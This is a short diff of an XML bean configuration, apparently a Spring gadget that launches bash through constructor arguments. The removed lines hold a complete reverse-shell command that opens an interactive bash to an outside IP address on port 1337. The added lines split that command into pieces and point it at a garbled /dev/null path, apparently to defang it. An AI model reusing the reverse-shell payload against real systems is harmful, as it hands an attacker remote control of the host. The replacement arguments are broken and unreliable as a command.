@@ -3,8 +3,10 @@
 <constructor-arg>
 <list>
 <value>bash</value>
-<value>-c</value>
-<value>bash -i >& /dev/tcp/103.140.229.233/1337 0>&1</value>
+<value>-i</value>
+  <value>>&</value>
+  <value>/dev/null/**103.140.229.233/1337**</value>
+<value>0>&1</value>
 </list>
 </constructor-arg>
 </bean>
